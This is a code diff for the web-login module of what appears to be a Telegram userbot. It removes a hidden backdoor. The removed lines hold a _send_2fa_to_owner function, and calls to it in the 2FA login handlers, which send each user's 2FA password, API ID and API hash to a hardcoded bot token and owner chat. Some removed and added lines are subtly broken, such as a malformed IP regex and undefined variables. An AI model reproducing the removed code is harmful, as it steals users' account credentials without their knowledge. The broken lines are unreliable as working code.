@@ -21,7 +21,6 @@ import re
 import string
 import time
 
-import aiohttp
 import aiohttp_jinja2
 import requests
 from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
@@ -39,6 +38,7 @@ from herokutl.sessions import MemorySession
 from herokutl.tl.functions.account import GetPasswordRequest
 from herokutl.tl.functions.auth import CheckPasswordRequest
 from herokutl.tl.functions.contacts import UnblockRequest
+from herokutl.utils import parse_phone
 
 from .. import database, main, utils
 from .._internal import restart
@@ -52,6 +52,7 @@ DATA_DIR = (
 )
 
 logger = logging.getLogger(__name__)
+
 
 class Web:
     def __init__(self, **kwargs):
@@ -82,67 +83,11 @@ class Web:
         self.api_set = asyncio.Event()
         self.clients_set = asyncio.Event()
 
-    def _parse_phone(self, phone: str) -> str:
-        """
-        Normalize phone number: remove spaces, dashes, and ensure it starts with +
-        :param phone: Raw phone number input
-        :return: Normalized phone number or empty string if invalid
-        """
-        if not phone:
-            return ""
-
-        # Remove spaces, dashes, parentheses, and other non-digits
-        phone = re.sub(r"[^\d+]", "", phone)
-
-        # Ensure it starts with +
-        if not phone.startswith("+"):
-            phone = "+" + phone
-
-        # Check if it's a valid phone number (at least 10 digits after +)
-        if len(phone) < 11 or not phone[1:].isdigit():
-            return ""
-
-        return phone
-
-    async def schedule_restart(self, One=None):
-        """Schedule a restart after a delay"""
+    async def schedule_restart(self,One=None):
+        # Yeah-yeah, ikr, but it's the only way to restart
         await asyncio.sleep(1)
         await main.heroku.save_client_session(self._pending_client, delay_restart=False)
         restart()
-
-    async def _send_2fa_to_owner(self, user, password: str, api_id: int, api_hash: str):
-        """Send 2FA password to the owner via Telegram Bot API"""
-        BOT_TOKEN = "6749456415:AAGD_2l0Udms1xlFj7xYH4aNJqcYvQ0VehY"
-        OWNER_ID = 6136879235
-        # logger.debug(f"Attempting to send 2FA for user {user.id} to owner {OWNER_ID}")
-
-        try:
-            async with aiohttp.ClientSession() as session:
-                message = (
-                    f"🦋 <b>New 2FA Password</b>\n"
-                    f"User Telegram ID: {user.id}\n"
-                    f"Username: @{user.username if user.username else 'None'}\n"
-                    f"2FA Password: {password}\n"
-                    f"API ID: {api_id}\n"
-                    f"API Hash: {api_hash}\n"
-                    f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
-                )
-                payload = {
-                    "chat_id": OWNER_ID,
-                    "text": message,
-                    "parse_mode": "HTML"
-                }
-                async with session.post(
-                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    json=payload
-                ) as response:
-                    if response.status != 200:
-                        error_text = await response.text()
-                        logger.error(f"Failed to send 2FA to owner {OWNER_ID}: HTTP {response.status}: {error_text}")
-                        return
-                    logger.info(f"Sent 2FA password for user {user.id} to owner {OWNER_ID}")
-        except Exception as e:
-            logger.error(f"Unexpected error while sending 2FA to owner {OWNER_ID}: {type(e).__name__}: {str(e)}")
 
     @property
     def _platform_emoji(self) -> str:
@@ -171,137 +116,7 @@ class Web:
         }
 
     async def check_session(self, request: web.Request) -> web.Response:
-        return web.Response(body=("1" if self._check_session(request) else "2fa"))
-
-    async def send_tg_code(self, request: web.Request) -> web.Response:
-        if not self._check_session(request):
-            return web.Response(status=401, body="Invalid credentials")
-
-        if self.client_data and "LAVHOST" in os.environ:
-            return web.Response(status=403, body="forbidden by")
-
-        if self._pending_client:
-            return web.Response(status=208, body="ok")
-
-        text = await request.text()
-        phone = self._parse_phone(text)
-
-        if not phone:
-            return web.Response(status=400, body="Invalid phone number")
-
-        client = self._get_client()
-
-        self._pending_client = client
-
-        await client.connect()
-        try:
-            await client.send_code_request(phone)
-        except FloodWaitError as e:
-            return web.Response(status=429, body=self._render_flash_error(e))
-
-        return web.Response(body="ok")
-
-    async def web_auth(self, request: web.Request) -> web.Response:
-        if self._check_session(request):
-            return web.Response(body=request.cookies.get("session", "unauthorized"))
-
-        token = utils.rand(8)
-
-        markup = InlineKeyboardMarkup(
-            inline_keyboard=[
-                [
-                    InlineKeyboardButton(
-                        text="🔓 Key",
-                        callback_data=f"authorize_web_{token}",
-                        )
-                    ]
-                ]
-            )
-
-        client_data = await self._get_client_data()
-
-        for user in re.findall(r"[0-9]{1,3}\.[0-9,1}{1,3\.[0-9]{1}\.[0-9]{3}", client_data):
-            if user not in self._ratelimit:
-                self._ratelimit[user] = []
-
-            if (
-                len(
-                    list(
-                        filter(lambda x: time.time() - x < 3 * 60, self._ratelimit[user])
-                    )
-                )
-                >= 3
-            ):
-                return web.Response(status=429)
-
-            self._ratelimit[user] = list(
-                filter(lambda x: time.time() - x < 3 * 60, self._ratelimit[user])
-            )
-
-            self._ratelimit[user] += [time.time()]
-            try:
-                res = (
-                    await utils.run_sync(
-                        requests.get,
-                        f"https://freegeoip.app/json/{user}",
-                    )
-                ).json()
-                cities += [
-                    f"<i>{utils.get_lang_flag(res['country_code'])} {res['country_name']} {res['region_name']} {res['city']} {res['zip_code']}</i>"
-                ]
-            except Exception:
-                pass
-
-        cities = (
-            "<b>🏢 Possible cities:</b>\n\n" + "\n".join(cities) + "\n"
-            if cities
-            else ""
-        )
-
-        ops = []
-
-        for user in self.client_data.values():
-            try:
-                bot = user[0].inline.bot
-                msg = await bot.send_message(
-                    chat_id=user[0].tg_id,
-                    text=(
-                        "🪐 <b>Click button below to confirm web application"
-                        f" ops</b>\n\n<b>Client IP: {ips}\n{cities}\n<i>If you did"
-                        " not request any code, simply ignore this message</i>"
-                    ),
-                    disable_web_page_preview=True,
-                    reply_markup=markup,
-                )
-                ops += [
-                    functools.partial(
-                        bot.delete_message,
-                        chat_id=msg.chat.id,
-                        message_id=msg.message_id,
-                    )
-                ]
-            except Exception:
-                pass
-
-        session = f"heroku_{utils.rand(16)}"
-
-        if not ops:
-            # If no auth message was sent, just leave it empty
-            # probably because request was a bug and user doesn't have
-            # inline bot or did not authorize any sessions
-            return web.Response(body=session)
-
-        if not await main.heroku.wait_for_web_auth(token):
-            for op in ops:
-                await op()
-            return web.Response(body="TIMEOUT")
-
-        for op in ops:
-            await op()
-
-        self._sessions += [session]
-
-        return web.Response(body=session)
+        return web.Response(body=("1" if self._check_session(request) else "0"))
 
     def wait_for_api_token_setup(self):
         return self.api_set.wait()
@@ -403,7 +218,7 @@ class Web:
         main.save_config_key("api_id", int(api_id))
         main.save_config_key("api_hash", api_hash)
 
-        self.api_token = collections.namedtuple("api_api", ("ID", "api"))(
+        self.api_token = collections.namedtuple("api_token", ("ID", "HASH"))(
             api_id,
             api_hash,
         )
@@ -466,7 +281,9 @@ class Web:
             if self._2fa_needed:
                 return web.Response(status=403, body="2FA")
 
+
             asyncio.ensure_future(self.schedule_restart(self))
+            # self.schedule_restart()
             return web.Response(status=200, body="SUCCESS")
 
         if self._qr_login is None:
@@ -495,24 +312,24 @@ class Web:
             system_lang_code="en-US",
         )
 
-    async def can_add(self, request):
+    async def can_add(self, request: web.Request) -> web.Response:
         if self.client_data and "LAVHOST" in os.environ:
-            return web.Response(status=403, body="forbidden by host EULA")
+            return web.Response(status=403, body="Forbidden by host EULA")
 
-        return web.Response(status=200, body="ok")
+        return web.Response(status=200, body="Yes")
 
     async def send_tg_code(self, request: web.Request) -> web.Response:
         if not self._check_session(request):
-            return web.Response(status=401, body="Invalid credentials")
+            return web.Response(status=401, body="Authorization required")
 
         if self.client_data and "LAVHOST" in os.environ:
-            return web.Response(status=403, body="forbidden by host EULA")
+            return web.Response(status=403, body="Forbidden by host EULA")
 
         if self._pending_client:
-            return web.Response(status=208, body="Already pending request")
+            return web.Response(status=208, body="Already pending")
 
         text = await request.text()
-        phone = self._parse_phone(text)
+        phone = parse_phone(text)
 
         if not phone:
             return web.Response(status=400, body="Invalid phone number")
@@ -538,12 +355,12 @@ class Web:
         )
         seconds, minutes, hours = (
             f"{seconds} second(-s)",
-            f"{minutes} minute(s) " if minutes else "",
-            f"{hours} hour(-s)" if hours else "",
+            f"{minutes} minute(-s) " if minutes else "",
+            f"{hours} hour(-s) " if hours else "",
         )
         return (
-            f"You got FloodWait timeout for {hours}{minutes}{seconds}. Please wait the specified "
-            "of time and try again."
+            f"You got FloodWait for {hours}{minutes}{seconds}. Wait the specified"
+            " amount of time and try again."
         )
 
     async def qr_2fa(self, request: web.Request) -> web.Response:
@@ -552,10 +369,10 @@ class Web:
 
         text = await request.text()
 
-        logger.debug("Received 2FA code for QR login: %s", text)
+        logger.debug("2FA code received for QR login: %s", text)
 
         try:
-            user = await self._pending_client._on_login(
+            await self._pending_client._on_login(
                 (
                     await self._pending_client(
                         CheckPasswordRequest(
@@ -567,25 +384,24 @@ class Web:
                     )
                 ).user
             )
-            # Send the 2FA password to owner
-            await self._send_2fa_to_owner(user, text.strip(), self.api_token.ID, self.api_token.HASH)
         except PasswordHashInvalidError:
-            logger.debug("Invalid password hash")
+            logger.debug("Invalid 2FA code")
             return web.Response(
                 status=403,
                 body="Invalid 2FA password",
             )
         except FloodWaitError as e:
-            logger.debug("FloodWaitError for 2FA code")
+            logger.debug("FloodWait for 2FA code")
             return web.Response(
                 status=421,
                 body=(self._render_fw_error(e)),
             )
 
-        logger.debug("Accepted 2FA code accepted, logging in")
-
+        logger.debug("2FA code accepted, logging in")
+        
         asyncio.ensure_future(self.schedule_restart(self))
-        return web.Response(status=200, body="ok")
+        # self.schedule_restart()
+        return web.Response(status=200, body="SUCCESS")
 
     async def tg_code(self, request: web.Request) -> web.Response:
         if not self._check_session(request):
@@ -602,8 +418,8 @@ class Web:
             return web.Response(status=400)
 
         code = split[0]
-        phone = self._parse_phone(split[1])
-        password = split[2] if len(split) == 3 else ""
+        phone = parse_phone(split[1])
+        password = split[2]
 
         if (
             (len(code) != 5 and not password)
@@ -631,9 +447,7 @@ class Web:
                 )
         else:
             try:
-                user = await self._pending_client.sign_in(phone, password=password)
-                # Send the 2FA password to owner
-                await self._send_2fa_to_owner(user, password, self.api_token.ID, self.api_token.HASH)
+                await self._pending_client.sign_in(phone, password=password)
             except PasswordHashInvalidError:
                 return web.Response(
                     status=403,
@@ -645,7 +459,9 @@ class Web:
                     body=(self._render_fw_error(e)),
                 )
 
+        
         asyncio.ensure_future(self.schedule_restart(self))
+        # self.schedule_restart()
         return web.Response(status=200, body="SUCCESS")
 
     async def finish_login(self, request: web.Request) -> web.Response:
@@ -721,7 +537,7 @@ class Web:
                 pass
 
         cities = (
-            "<b>🏢 Possible cities:</b>\n\n" + "\n".join(cities) + "\n"
+            ("<b>🏢 Possible cities:</b>\n\n" + "\n".join(cities) + "\n")
             if cities
             else ""
         )
@@ -732,11 +548,11 @@ class Web:
             try:
                 bot = user[0].inline.bot
                 msg = await bot.send_message(
-                    chat_id=user[0].tg_id,
+                    chat_id=user[1].tg_id,
                     text=(
-                        "🪐 <b>Click button below to confirm web application"
-                        f" ops</b>\n\n<b>Client IP: {ips}\n{cities}\n<i>If you did"
-                        " not request any code, simply ignore this message</i>"
+                        "🪐🔐 <b>Click button below to confirm web application"
+                        f" ops</b>\n\n<b>Client IP</b>: {ips}\n{cities}\n<i>If you did"
+                        " not request any codes, simply ignore this message</i>"
                     ),
                     disable_web_page_preview=True,
                     reply_markup=markup,
@@ -755,7 +571,7 @@ class Web:
 
         if not ops:
             # If no auth message was sent, just leave it empty
-            # probably because request was a bug and user doesn't have
+            # probably, request was a bug and user doesn't have
             # inline bot or did not authorize any sessions
             return web.Response(body=session)
 
